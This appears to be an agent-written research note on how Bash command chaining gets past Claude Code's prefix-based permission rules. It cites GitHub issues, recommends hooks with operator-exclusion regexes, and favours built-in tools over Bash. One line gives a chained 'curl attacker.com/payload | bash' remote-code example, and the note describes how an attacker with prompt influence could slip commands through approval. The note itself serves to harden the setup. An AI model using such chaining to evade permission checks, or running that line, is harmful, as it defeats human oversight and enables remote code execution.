# Research: Claude Code Bash Command Chaining and Permissions

Date: 2025-12-01
Focus: How bash command chaining (&&, ||, ;, |) interacts with Claude Code's permission system
Agent: researcher

## Summary

Claude Code uses **prefix matching** for Bash permission rules, which creates fundamental limitations with command chaining. While official documentation claims shell operator awareness, real-world testing reveals significant bypasses. The recommended approach is to use specialized tools (Read, Grep, Glob) instead of Bash when possible, and implement custom hooks with regex-based exclusion patterns for complex scenarios.

## Key Findings

1. **Prefix Matching is Limited** - Bash patterns like `Bash(git status:*)` only check if commands *start with* the pattern - [Official Docs](https://code.claude.com/docs/en/iam)

2. **Shell Operator Awareness is Incomplete** - Documentation claims Claude Code blocks `safe-cmd && other-cmd` but testing shows 97-100% of bypass techniques still work - [GitHub Issue #4956](https://github.com/anthropics/claude-code/issues/4956)

3. **Chained Commands Always Trigger Prompts** - Commands like `curl -s ... | jq .` or `cd dir && command` require manual approval even with patterns configured - [GitHub Issue #2023](https://github.com/anthropics/claude-code/issues/2023)

4. **Pre-approved Patterns for Chains Don't Work Reliably** - Patterns like `Bash(cd :* && npx nx build :*)` fail to prevent approval prompts - [GitHub Issue #8862](https://github.com/anthropics/claude-code/issues/8862)

5. **Specialized Tools Are Pre-approved** - Read, Grep, Glob tools don't require permission prompts and should be preferred over Bash - [Best Practices](https://www.anthropic.com/engineering/claude-code-best-practices)

6. **Hooks Provide Reliable Control** - Custom pre-tool hooks with regex patterns and explicit exclusions for shell operators offer the most robust solution - [Korny's Blog](https://blog.korny.info/2025/10/10/better-claude-code-permissions)

## Detailed Analysis

### How Prefix Matching Works

Claude Code's permission system uses simple prefix matching for Bash rules:

```
Bash(npm run build)     → matches exact command
Bash(npm run test:*)    → matches commands starting with "npm run test"
Bash(git log:*)         → matches commands starting with "git log"
```

The `:*` wildcard only works at the **end** of patterns. There is no support for:
- Regex patterns in standard allowedTools
- Glob-style matching mid-pattern
- Pattern matching after shell operators

### Why Chaining Breaks Permission Matching

**The Core Issue**: When you approve `git status`, the pattern stored is `Bash(git status)` or `Bash(git status:*)`. When Claude runs `git status && git diff`:

1. The full command string is `git status && git diff`
2. This does NOT prefix-match `Bash(git status)` because the full string has extra content
3. Even if you approve `Bash(git status && git diff)`, slight variations still fail

**Documented Claim vs Reality**:

The IAM documentation states:
> "Claude Code is aware of shell operators (like &&) so a prefix match rule like Bash(safe-cmd:*) won't give it permission to run the command safe-cmd && other-cmd"

However, testing in [Issue #4956](https://github.com/anthropics/claude-code/issues/4956) showed:
- 47-48 out of 52 bypass techniques worked (97.9-100% success)
- Operators tested: `&&`, `;`, `|`, `||`, `&`, `$(...)`, backticks

### Security Implications

The mismatch between documentation and behavior creates security risks:

1. **False Sense of Security** - Users think patterns block chaining but they don't
2. **Bypass Vectors** - An attacker with prompt influence could chain approved commands with malicious ones
3. **RCE Risk** - `safe-cmd && curl attacker.com/payload | bash`

Anthropic has acknowledged this and directs security reports to HackerOne.

### GitHub Issues Summary

| Issue | Problem | Status |
|-------|---------|--------|
| [#4956](https://github.com/anthropics/claude-code/issues/4956) | Security bypass via chaining | Under review (HackerOne) |
| [#612](https://github.com/anthropics/claude-code/issues/612) | && bypasses explicit prohibitions | Closed as duplicate of #393 |
| [#2023](https://github.com/anthropics/claude-code/issues/2023) | Chained curl commands need approval | Open - workaround suggested |
| [#793](https://github.com/anthropics/claude-code/issues/793) | grep/head/tail chains need approval | Closed - improvements shipped |
| [#8862](https://github.com/anthropics/claude-code/issues/8862) | cd && command patterns don't work | Open - no workaround |

### Recommended Patterns

#### Pattern 1: Use Specialized Tools (Preferred)

Instead of Bash for common operations:

| Need | Bad (Bash) | Good (Tool) |
|------|------------|-------------|
| Find files | `find . -name "*.py"` | `Glob(pattern="**/*.py")` |
| Search content | `grep -r "pattern" .` | `Grep(pattern="pattern")` |
| Read files | `cat file.txt` | `Read(file_path="file.txt")` |
| Chained search | `find . \| xargs grep` | `Grep(pattern="x", glob="**/*")` |

These tools are pre-approved and don't trigger permission prompts.

#### Pattern 2: Hook-Based Approval (For Complex Bash Needs)

Create a pre-tool hook that uses regex with explicit operator exclusions:

```toml
[[allow]]
tool = "Bash"
command_regex = "^npx -p @mermaid-js/mermaid-cli mmdc "
command_exclude_regex = "&|;|\\||`"
```

The `command_exclude_regex` blocks chaining operators entirely, allowing specific commands while preventing injection.

#### Pattern 3: Separate Commands (When Chaining is Unavoidable)

Instead of:
```bash
cd /path && npm run build
```

Use separate calls:
```bash
# First call
cd /path
# Second call (in same session)
npm run build
```

Or use absolute paths:
```bash
npm run --prefix /path build
```

#### Pattern 4: Pre-approve Complete Chains (Limited Effectiveness)

For specific known chains, you can try:
```json
{
  "allow": ["Bash(curl:*&&*)"]
}
```

But this has limited effectiveness per [Issue #8862](https://github.com/anthropics/claude-code/issues/8862).

### Official Recommendations

From [Claude Code Best Practices](https://www.anthropic.com/engineering/claude-code-best-practices):

1. **Use smallest necessary scope** - Approve at file/directory level, not globally
2. **Add domains to allowlist** - Use `/permissions` for repeated patterns
3. **Custom slash commands** - Create reusable, parameterized workflows
4. **Headless mode with care** - `-p` flag for automation but requires safety measures
5. **Container sandboxing** - If using `--dangerously-skip-permissions`, run in isolated container

## Applicable Patterns for Claudectl

For the claudectl codebase and CLAUDE.md guidance:

1. **Document Tool Preferences**
   - Emphasize Read/Grep/Glob as primary tools for exploration
   - Only fall back to Bash for git operations and pipelines

2. **Pre-approve Safe Git Commands**
   - `Bash(git status:*)`
   - `Bash(git log:*)`
   - `Bash(git diff:*)`
   - But acknowledge these won't cover chained variants

3. **Consider Hook Implementation**
   - A pre-tool hook could validate Bash commands against patterns
   - Use `command_exclude_regex` to block shell operators on sensitive commands

4. **Guide Agent Behavior**
   - Instruct agents to avoid chaining when possible
   - Prefer multiple separate commands over one chained command
   - Use tool equivalents instead of Bash pipelines

## Sources

- [Claude Code IAM Documentation](https://code.claude.com/docs/en/iam)
- [Claude Code Settings Documentation](https://code.claude.com/docs/en/settings)
- [GitHub Issue #4956 - Security Vulnerability: Bash Permission Bypass](https://github.com/anthropics/claude-code/issues/4956)
- [GitHub Issue #612 - && Bypass Bug](https://github.com/anthropics/claude-code/issues/612)
- [GitHub Issue #2023 - Chained Curl Approvals](https://github.com/anthropics/claude-code/issues/2023)
- [GitHub Issue #793 - Chained grep/head/tail](https://github.com/anthropics/claude-code/issues/793)
- [GitHub Issue #8862 - cd && command patterns](https://github.com/anthropics/claude-code/issues/8862)
- [Claude Code Best Practices - Anthropic](https://www.anthropic.com/engineering/claude-code-best-practices)
- [Better Claude Code Permissions - Korny's Blog](https://blog.korny.info/2025/10/10/better-claude-code-permissions)

## Confidence Level

**High** - Multiple sources confirm the same core findings: prefix matching is limited, chaining bypasses are documented, and specialized tools are the recommended alternative. The security implications have been acknowledged by Anthropic (directed to HackerOne).

## Related Questions

- How can hooks be integrated into claudectl's template system?
- What regex patterns would cover common development workflows?
- Should claudectl provide a default hook configuration for safe Bash usage?
- How do MCP tools interact with the same permission system?
